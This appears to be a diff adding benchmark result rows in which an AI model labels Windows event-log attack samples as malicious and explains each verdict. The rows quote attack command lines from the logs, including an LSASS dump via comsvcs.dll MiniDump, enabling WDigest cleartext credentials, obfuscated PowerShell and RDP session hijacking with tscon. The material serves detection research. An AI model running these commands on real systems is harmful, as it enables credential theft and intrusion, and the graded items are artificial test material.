+gpt-5.5-2026-04-23,ID1-WMI spwaning PowerShell process - WMImplant.evtx,easy,B,processed,YES,100.0,100.0,YES,1,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe",OFFSEC\admmig,"powershell $env:I4Pzl|.(Get-C`ommand ('{1}e{0}'-f'x','i')), C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",fs03vuln.offsec.lan,,0.0,7.17,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
+- Accounts: OFFSEC\admmig
+- Commands: powershell $env:I4Pzl|.(Get-C`ommand ('{1}e{0}'-f'x','i')), C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
+- Network: fs03vuln.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The event shows powershell.exe launched by WmiPrvSE.exe under OFFSEC\admmig with a High integrity level. The PowerShell command uses an environment variable and obfuscated Get-Command expression, which is consistent with malicious PowerShell execution via WMI."
+gpt-5.5-2026-04-23,ID1-WMIexec process execution.evtx,easy,A,processed,YES,100.0,90.0,YES,1,"C:\Windows\System32\cmd.exe, Cmd.Exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat, C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt | \\127.0.0.1\C$\__output 2^&gt | ^&amp | 1 &gt | C:\Windows\TEMP\execute.bat &amp | C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp | del C:\Windows\TEMP\execute.bat","fs02.offsec.lan, 127.0.0.1",,33.3,14.44,5.4,6.0,2.7,3,17.1,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\cmd.exe, C:\Windows\system32\cmd.exe, Cmd.Exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat, C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; C:\Windows\TEMP\execute.bat &amp; C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp; del C:\Windows\TEMP\execute.bat
+- Network: fs02.offsec.lan, 127.0.0.1
+- Registry: None
+
+EXPLANATION:
+The event shows cmd.exe running as NT AUTHORITY\SYSTEM to execute C:\Windows\TEMP\execute.bat, with a parent command that creates the batch file, redirects output to \\127.0.0.1\C$\__output, runs it, and deletes it. This temporary command execution and cleanup pattern under SYSTEM is consistent with attack behavior rather than routine activity."
+gpt-5.5-2026-04-23,ID3-7-10-Suspicious DLL loaded (CME+Mimikatz).evtx,easy,A,processed,YES,100.0,100.0,YES,"7, 3, 10","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\system32\lsass.exe",OFFSEC\admmig,,"fs03vuln.offsec.lan, 10.23.42.38, 10.23.123.11",,0.0,10.36,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 7, 3, 10
+- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\system32\lsass.exe
+- Accounts: OFFSEC\admmig
+- Commands: None
+- Network: fs03vuln.offsec.lan, 10.23.42.38, 10.23.123.11
+- Registry: None
+
+EXPLANATION:
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe under OFFSEC\admmig initiated tcp connections from 10.23.42.38 to 10.23.123.11 on port 443 and loaded PowerShell and WMI-related components. The same PowerShell process then accessed C:\Windows\system32\lsass.exe with GrantedAccess 0x143A, which is consistent with malicious credential access behavior."
+gpt-5.5-2026-04-23,ID33205-SQL Server member added to server role.evtx,easy,A,processed,YES,100.0,93.8,YES,33205,,"OFFSEC\admmig, dbo, test-sql",ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql,mssql01.offsec.lan,,0.0,9.80,5.6,5.0,4.0,3,17.6,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 33205
+- Processes: None
+- Accounts: OFFSEC\admmig, dbo, test-sql
+- Commands: ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql]
+- Network: mssql01.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The event shows OFFSEC\admmig successfully executed ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql]. Adding test-sql to the sysadmin role grants elevated SQL Server privileges, which is consistent with privilege escalation behavior."
+gpt-5.5-2026-04-23,ID4688-SPN added to an account.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe","lambda-user, offsec\honey-pot1","SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*","jump01.offsec.lan, HACK-ME-PC.offsec.lan",,0.0,10.55,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4688
+- Processes: C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe
+- Accounts: lambda-user, offsec\honey-pot1
+- Commands: SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*
+- Network: jump01.offsec.lan, HACK-ME-PC.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The same account, lambda-user, ran setspn.exe from cmd.exe to add an MSSQLSvc SPN for HACK-ME-PC.offsec.lan to offsec\honey-pot1 and then queried SPNs across offsec. This paired SPN modification followed by SPN enumeration is consistent with attack behavior rather than routine activity."
+gpt-5.5-2026-04-23,ID4724-5145-password reset with setNTLM (Mimikatz).evtx,easy,A,processed,YES,100.0,88.9,YES,"4624, 5145, 4724, 4738",Kerberos,"admmig, hacker2, ROOTDC1$",,"rootdc1.offsec.lan, 10.23.23.9, fe80::1cae:5aa4:9d8d:106a",,0.0,12.59,5.3,5.0,4.0,2,16.3,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4624, 5145, 4724, 4738
+- Processes: Kerberos
+- Accounts: admmig, hacker2, ROOTDC1$
+- Commands: None
+- Network: rootdc1.offsec.lan, 10.23.23.9, fe80::1cae:5aa4:9d8d:106a
+- Registry: None
+
+EXPLANATION:
+Multiple 4624 LogonType 3 Kerberos logons for admmig from 10.23.23.9 are followed by 5145 access to \\*\IPC$ with RelativeTargetName samr. The same admmig logon then performs Event ID 4724 against hacker2, followed immediately by Event ID 4738 showing PasswordLastSet for hacker2, indicating a remote password reset/account modification pattern."
+gpt-5.5-2026-04-23,ID4648-4624-RunAsCS login.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4648, 4624, 4688","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe","admmig, test10, FS03$","/c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami","FS03.offsec.lan, localhost, FS03",,0.0,9.83,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4648, 4624, 4688
+- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe
+- Accounts: admmig, test10, FS03$
+- Commands: /c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami
+- Network: FS03.offsec.lan, localhost, FS03
+- Registry: None
+
+EXPLANATION:
+The Security log was cleared by admmig, immediately followed by explicit credential use from powershell.exe for test10 and a LogonType 3 logon. The subsequent process chain runs cmd.exe with /c whoami and whoami.exe under test10, which is suspicious when correlated with the prior log clearing and credential activity."
+gpt-5.5-2026-04-23,"ID4688,4624-RottenPotatoNG.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4624","C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","hack1, ANONYMOUS LOGON, FS03VULN$","MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff","fs03vuln.offsec.lan, 127.0.0.1",,0.0,10.34,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688, 4624
+- Processes: C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe
+- Accounts: hack1, ANONYMOUS LOGON, FS03VULN$
+- Commands: MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff
+- Network: fs03vuln.offsec.lan, 127.0.0.1
+- Registry: None
+
+EXPLANATION:
+The logs show the Security log was cleared by hack1, followed immediately by execution of C:\TOOLS\MSFRottenPotato.exe. Shortly after, C:\Windows\System32\cmd.exe and C:\Windows\System32\conhost.exe were spawned under FS03VULN$, indicating a suspicious privilege escalation pattern."
+gpt-5.5-2026-04-23,"ID4688,4648,4624-Runas execution with different user.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4648, 4624, 4672","C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe","admmig, hack1, FS03$","runas  /user:offsec\hack1 cmd.exe , cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe","FS03.offsec.lan, localhost, ::1, FS03",,0.0,10.65,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688, 4648, 4624, 4672
+- Processes: C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe
+- Accounts: admmig, hack1, FS03$
+- Commands: runas  /user:offsec\hack1 cmd.exe , cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe
+- Network: FS03.offsec.lan, localhost, ::1, FS03
+- Registry: None
+
+EXPLANATION:
+The Security log was cleared by admmig, followed immediately by runas launching cmd.exe as hack1. The hack1 account then received special privileges and spawned command-related processes, making the sequence consistent with suspicious post-log-clearing privilege use."
+gpt-5.5-2026-04-23,"4624,4674,4688- CrackMap Exec SMB mimikatz.evtx",easy,B,processed,YES,100.0,76.4,YES,"4624, 4674, 4688","C:\Windows\System32\services.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe","ANONYMOUS LOGON, admmig, FS03VULN$","cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C, powershell.exe  -exec bypass -noni -nop -w 1 -C, \??\C:\Windows\system32\conhost.exe 0xffffffff, C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""","fs03vuln.offsec.lan, 10.23.123.11","\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB",0.0,35.93,4.6,6.0,4.0,4,18.6,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4624, 4674, 4688
+- Processes: C:\Windows\System32\services.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
+- Accounts: ANONYMOUS LOGON, admmig, FS03VULN$
+- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C, powershell.exe  -exec bypass -noni -nop -w 1 -C, \??\C:\Windows\system32\conhost.exe 0xffffffff, C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""
+- Network: fs03vuln.offsec.lan, 10.23.123.11
+- Registry: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB
+
+EXPLANATION:
+Multiple LogonType 3 events for admmig from 10.23.123.11 are followed by privileged object access and process creation. The command lines show cmd.exe launching powershell.exe with -exec bypass, -noni, -nop, and hidden window flags, followed later by C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd"", which indicates attack behavior rather than routine activity."
+gpt-5.5-2026-04-23,ID1-CrackMapExec payload execution.evtx,easy,B,processed,YES,100.0,75.0,YES,1,"C:\Windows\System32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe",OFFSEC\admmig,"cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C, powershell.exe  -exec bypass -noni -nop -w 1 -C, C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",win10-02.offsec.lan,,0.0,42.89,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
+- Accounts: OFFSEC\admmig
+- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C, powershell.exe  -exec bypass -noni -nop -w 1 -C, C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
+- Network: win10-02.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The events show C:\Windows\System32\wbem\WmiPrvSE.exe spawning C:\Windows\System32\cmd.exe, which then launches C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe as OFFSEC\admmig with suspicious flags including -exec bypass -noni -nop -w 1. The long obfuscated PowerShell command using -JOIN in this WMI-to-cmd-to-PowerShell chain indicates attack behavior rather than routine activity."
+gpt-5.5-2026-04-23,ID400-800-CrackMapExec payload execution.evtx,easy,A,processed,YES,100.0,100.0,YES,"600, 400, 800, 403",powershell.exe,OFFSEC\admmig,"powershell.exe -exec bypass -noni -nop -w 1 -C &amp | ( $PshOMe[4]+$PshoME[30]+'X'), if ( &amp | { Set-StrictMode -Version 1 | $_.PSMessageDetails } ) {, &amp | $this.Exception.InnerException.PSMessageDetails }, $errorCategoryMsg = &amp | $_.ErrorCategory_Message }, $originInfo = &amp | $_.OriginInfo }, CommandInvocation(Out-Default): ""Out-Default""",win10-02.offsec.lan,,16.7,21.16,6.0,6.0,3.3,4,19.3,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 600, 400, 800, 403
+- Processes: powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: powershell.exe -exec bypass -noni -nop -w 1 -C &amp; ( $PshOMe[4]+$PshoME[30]+'X'), if ( &amp; { Set-StrictMode -Version 1; $_.PSMessageDetails } ) {, &amp; { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }, $errorCategoryMsg = &amp; { Set-StrictMode -Version 1; $_.ErrorCategory_Message }, $originInfo = &amp; { Set-StrictMode -Version 1; $_.OriginInfo }, CommandInvocation(Out-Default): ""Out-Default""
+- Network: win10-02.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The logs show powershell.exe launched with -exec bypass, -noni, -nop, and -w 1 along with an obfuscated command using character conversion and -JoIn. The PowerShell output states, ""This script contains malicious content and has been blocked by your antivirus software,"" indicating the activity was malicious."
+gpt-5.5-2026-04-23,ID1-12-13-Wdigest authentication activation.evtx,easy,A,processed,YES,100.0,90.0,YES,"1, 12, 13","C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe",OFFSEC\admmig,"reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1, ""C:\Windows\system32\cmd.exe""",fs03vuln.offsec.lan,"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",0.0,11.78,5.4,6.0,4.0,4,19.4,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1, 12, 13
+- Processes: C:\Windows\System32\reg.exe, C:\Windows\system32\reg.exe, C:\Windows\System32\cmd.exe
+- Accounts: OFFSEC\admmig
+- Commands: reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1, ""C:\Windows\system32\cmd.exe"" 
+- Network: fs03vuln.offsec.lan
+- Registry: HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
+
+EXPLANATION:
+The events show OFFSEC\admmig running reg.exe from cmd.exe to add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest and set UseLogonCredential to DWORD (0x00000001). The related Sysmon events are tagged as Modify Registry and Credential Dumping, and the create-key followed by set-value pattern on WDigest indicates attack behavior."
+gpt-5.5-2026-04-23,ID1-LSASS dump with LSASSY (SYSMON).evtx,easy,B,processed,YES,100.0,95.8,YES,"18, 1, 7, 11, 10","C:\Windows\system32\wbem\wmiprvse.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\rundll32.exe, C:\Windows\system32\lsass.exe",OFFSEC\admmig,"powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full | Wait-Process -Id (Get-Process rundll32).id"", C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding, ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full",FS03.offsec.lan,,0.0,21.86,5.8,5.0,4.0,3,17.8,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 18, 1, 7, 11, 10
+- Processes: C:\Windows\system32\wbem\wmiprvse.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe, C:\Windows\System32\rundll32.exe, C:\Windows\system32\lsass.exe
+- Accounts: OFFSEC\admmig
+- Commands: powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full;Wait-Process -Id (Get-Process rundll32).id"", C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding, ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full
+- Network: FS03.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The command line shows powershell.exe -NoP launching rundll32.exe with C:\Windows\System32\comsvcs.dll MiniDump targeting (Get-Process lsass).Id and writing \Windows\Temp\76nivOxA.dmp. The related events show C:\Windows\System32\rundll32.exe accessing C:\Windows\system32\lsass.exe with GrantedAccess 0x1FFFFF and creating C:\Windows\Temp\76nivOxA.dmp, which indicates LSASS dumping behavior."
+gpt-5.5-2026-04-23,ID10-Mimikatz LSASS process dump.evtx,easy,A,processed,YES,100.0,80.0,YES,"1, 10","C:\TOOLS\Mimikatzx64\mimikatz.exe, C:\Windows\System32\cmd.exe, C:\Windows\system32\lsass.exe","OFFSEC\admmig, NT AUTHORITY\SYSTEM","mimikatz.exe, cmd.exe, ""C:\Windows\system32\cmd.exe""",FS03.offsec.lan,,0.0,12.61,4.8,5.0,4.0,3,16.8,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1, 10
+- Processes: C:\TOOLS\Mimikatzx64\mimikatz.exe, C:\Windows\System32\cmd.exe, C:\Windows\system32\lsass.exe
+- Accounts: OFFSEC\admmig, NT AUTHORITY\SYSTEM
+- Commands: mimikatz.exe, cmd.exe, ""C:\Windows\system32\cmd.exe"" 
+- Network: FS03.offsec.lan
+- Registry: None
+
+EXPLANATION:
+C:\TOOLS\Mimikatzx64\mimikatz.exe was executed by OFFSEC\admmig and then accessed C:\Windows\system32\lsass.exe with GrantedAccess 0x1010. The same mimikatz.exe process also spawned C:\Windows\System32\cmd.exe running as NT AUTHORITY\SYSTEM, indicating credential-access and privilege escalation behavior."
+gpt-5.5-2026-04-23,ID4688-Audit policy enumerated.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4674","C:\Windows\System32\auditpol.exe, C:\Windows\System32\lsass.exe",admmig,"""C:\Windows\system32\auditpol.exe""  /get /category:*",FS03.offsec.lan,,0.0,8.10,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688, 4674
+- Processes: C:\Windows\System32\auditpol.exe, C:\Windows\System32\lsass.exe
+- Accounts: admmig
+- Commands: ""C:\Windows\system32\auditpol.exe""  /get /category:*
+- Network: FS03.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The Security event log was cleared by admmig, which is a strong indicator of defense evasion. Immediately afterward, the same account executed auditpol.exe to query audit policy and used SeSecurityPrivilege via lsass.exe, forming a suspicious pattern around audit/log manipulation."
+gpt-5.5-2026-04-23,ID4688-Firewall configuration enumerated (command).evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688",C:\Windows\System32\netsh.exe,admmig,"netsh  advfirewall show allprofiles, netsh  a show allprofiles",FS03.offsec.lan,,0.0,6.04,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688
+- Processes: C:\Windows\System32\netsh.exe
+- Accounts: admmig
+- Commands: netsh  advfirewall show allprofiles, netsh  a show allprofiles
+- Network: FS03.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The Security event log was cleared by admmig, which is a strong anti-forensics indicator. Immediately afterward, the same account executed netsh.exe commands to inspect firewall profiles, making the sequence suspicious and consistent with attack behavior."
+gpt-5.5-2026-04-23,ID4688-Scheduled task configuration enumeration.evtx,easy,A,processed,YES,100.0,90.0,YES,"1102, 4688, 5145",C:\Windows\System32\schtasks.exe,admmig,schtasks  /query /xml,"FS03.offsec.lan, 10.23.23.9",,0.0,11.97,5.4,6.0,4.0,3,18.4,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688, 5145
+- Processes: C:\Windows\System32\schtasks.exe
+- Accounts: admmig
+- Commands: schtasks  /query /xml
+- Network: FS03.offsec.lan, 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The Security log was cleared by admmig, followed immediately by execution of schtasks  /query /xml under the same account. The same account also accessed \\*\C$ from 10.23.23.9, making the sequence suspicious for activity cleanup and discovery over an administrative share."
+gpt-5.5-2026-04-23,"ID4688,4778,4779 RDP hijack direct.evtx",easy,A,processed,YES,100.0,100.0,YES,"4688, 4779, 4778","C:\Windows\System32\cmd.exe, C:\Windows\System32\tscon.exe, C:\Windows\System32\TSTheme.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\AtBroker.exe, C:\Windows\System32\winlogon.exe, C:\Windows\System32\rdpclip.exe, C:\Windows\System32\taskhostw.exe, C:\Windows\System32\dllhost.exe","FS01$, admmig, admmarsid","cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8, C:\Windows\system32\TSTheme.exe -Embedding, atbroker.exe, rdpclip, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}, taskhostw.exe U, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}","fs01.offsec.lan, JUMP01, 10.23.23.9",,0.0,20.27,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4688, 4779, 4778
+- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\tscon.exe, C:\Windows\System32\TSTheme.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\AtBroker.exe, C:\Windows\System32\winlogon.exe, C:\Windows\System32\rdpclip.exe, C:\Windows\System32\taskhostw.exe, C:\Windows\System32\dllhost.exe
+- Accounts: FS01$, admmig, admmarsid
+- Commands: cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8, C:\Windows\system32\TSTheme.exe -Embedding, atbroker.exe, rdpclip, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}, taskhostw.exe U, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}
+- Network: fs01.offsec.lan, JUMP01, 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The logs show cmd.exe launching tscon.exe with the command tscon  2 /dest:rdp-tcp#8, followed immediately by a 4779 disconnect for admmig and a 4778 reconnect for admmarsid on RDP-Tcp#8 from JUMP01 at 10.23.23.9. This pattern indicates an RDP session switch using tscon rather than routine logon activity."
+gpt-5.5-2026-04-23,ID4688-4778 RDP hijack command execution.evtx,easy,A,processed,YES,100.0,100.0,YES,"4688, 4778","C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\tscon.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\TSTheme.exe, C:\Windows\System32\rdpclip.exe, C:\Windows\System32\AtBroker.exe, C:\Windows\System32\rdpinput.exe, C:\Windows\System32\consent.exe, C:\Windows\System32\taskhostw.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\mmc.exe, C:\Windows\System32\backgroundTaskHost.exe, C:\Windows\System32\services.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\winlogon.exe, C:\Windows\explorer.exe","admmig, FS01$, admmarsid","sc.exe  start hijackservice, cmd.exe /k tscon 2 /dest:rdp-tcp#5, tscon  2 /dest:rdp-tcp#5, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, C:\Windows\system32\TSTheme.exe -Embedding, rdpclip, atbroker.exe, ""C:\Windows\System32\rdpinput.EXE"" /pid:3820 /handle:1456, consent.exe 1072 362 000001A5ECFB0F80, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, C:\Windows\system32\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}, ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s, consent.exe 1072 426 000001A5F05BA860, ""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca","fs01.offsec.lan, JUMP01, 10.23.23.9",,0.0,14.63,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4688, 4778
+- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\tscon.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\TSTheme.exe, C:\Windows\System32\rdpclip.exe, C:\Windows\System32\AtBroker.exe, C:\Windows\System32\rdpinput.exe, C:\Windows\System32\consent.exe, C:\Windows\System32\taskhostw.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\mmc.exe, C:\Windows\System32\backgroundTaskHost.exe, C:\Windows\System32\services.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\winlogon.exe, C:\Windows\explorer.exe
+- Accounts: admmig, FS01$, admmarsid
+- Commands: sc.exe  start hijackservice, cmd.exe /k tscon 2 /dest:rdp-tcp#5, tscon  2 /dest:rdp-tcp#5, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, C:\Windows\system32\TSTheme.exe -Embedding, rdpclip, atbroker.exe, ""C:\Windows\System32\rdpinput.EXE"" /pid:3820 /handle:1456, consent.exe 1072 362 000001A5ECFB0F80, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, C:\Windows\system32\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}, ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s, consent.exe 1072 426 000001A5F05BA860, ""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca
+- Network: fs01.offsec.lan, JUMP01, 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The sequence shows admmig starting hijackservice with sc.exe, immediately followed by FS01$ running cmd.exe /k tscon 2 /dest:rdp-tcp#5 and tscon  2 /dest:rdp-tcp#5. This pattern, paired with the RDP reconnect event for admmarsid from JUMP01 at 10.23.23.9, indicates attack behavior rather than routine activity."
